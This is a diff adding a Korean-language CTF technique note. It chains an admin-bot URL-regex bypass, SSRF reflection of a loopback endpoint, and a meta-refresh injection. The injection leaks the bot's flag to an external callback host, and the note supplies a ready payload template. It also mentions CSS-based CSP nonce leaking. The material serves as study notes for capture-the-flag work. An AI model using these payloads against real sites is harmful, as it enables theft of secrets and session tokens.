@@ -75,6 +75,24 @@ time.sleep(8)
 - CSP가 resource fetch는 막아도 meta refresh navigation은 별도다. `navigate-to` 유무를 확인한다.
 - token을 얻은 뒤에는 "현재 세션 권한"이 아니라 "body/query token"만 검증하는 API를 먼저 찾는다.
 
+### Bot URLRegex `/admin/../` + SSRF Reflection + Meta Refresh Leak
+
+admin bot이 `^https://host/admin/` 같은 문자열 정규식만 검사한 뒤 Chromium으로 이동하면, `/admin/../?url=...`는 정규식을 통과하지만 브라우저 요청은 `/`로 정규화될 수 있다.
+루트 페이지가 `url` 파라미터를 서버사이드로 fetch하고 결과를 `|safe` 렌더링하면 다음 체인을 먼저 검증한다.
+
+체크리스트:
+- 봇 소스에서 `page.goto(url + flag)`처럼 secret을 URL 뒤에 붙이는지 확인한다.
+- 서버의 POST 필터가 있어도 봇은 GET URL을 직접 방문하므로, GET query의 SSRF 파라미터가 필터 없이 처리되는지 본다.
+- `http://127.0.0.1:<port>/admin?q=...`를 서버사이드 fetch 대상으로 넣어 loopback-only endpoint 응답을 HTML에 반사시킨다.
+- CSP에 `navigate-to`가 없으면 inline script 대신 `<meta http-equiv=refresh>`로 외부 콜백에 이동시킨다.
+- flag 뒤를 제어할 수 없을 때는 quoted attribute를 열지 말고 `content=0;url=https://callback/leak?f=`처럼 unquoted attribute를 사용한다. 템플릿의 다음 공백/`>`가 태그를 닫아준다.
+
+형태:
+```text
+outer = https://host/admin/../?url=<urlencoded inner>
+inner = http://127.0.0.1:5000/admin?q=<urlencoded "</h3><meta http-equiv=refresh content=0;url=https://callback/leak?f=">
+```
+
 ### CSP Nonce CSS Leak + Cache Reuse XSS
 
 `script-src 'nonce-...'`가 있고 `style-src 'unsafe-inline'`이면, CSS selector로 CSP meta `content`의 nonce 조각을 외부 URL로 leak할 수 있다.
